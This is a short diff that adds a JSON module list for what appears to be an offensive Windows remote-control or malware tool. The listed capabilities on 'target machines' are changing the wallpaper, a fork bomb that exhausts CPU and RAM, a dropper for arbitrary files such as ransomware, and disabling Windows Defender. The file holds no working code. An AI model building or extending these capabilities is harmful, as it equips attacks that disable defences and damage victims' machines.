@@ -1,0 +1,22 @@
+{
+	"change_wallpaper": {
+		"desc": "Changes Wallpaper of Target Machine",
+		"url": 1,
+		"server": 0
+	},
+	"fork_bomb": {
+		"desc": "Make Windows Unresponsive using a .bat Script ( 100% CPU and RAM Usage )",
+		"url": 0,
+		"server": 0
+	},
+	"dropper": {
+		"desc": "Drop and Execute a File of your Choice, ransomware maybe... ;)",
+		"url": 0,
+		"server": 1
+	},
+	"anti_defender": {
+		"desc": "Disables Windows Defender Service on Target Machine",
+		"url": 0,
+		"server": 0
+	}
+}
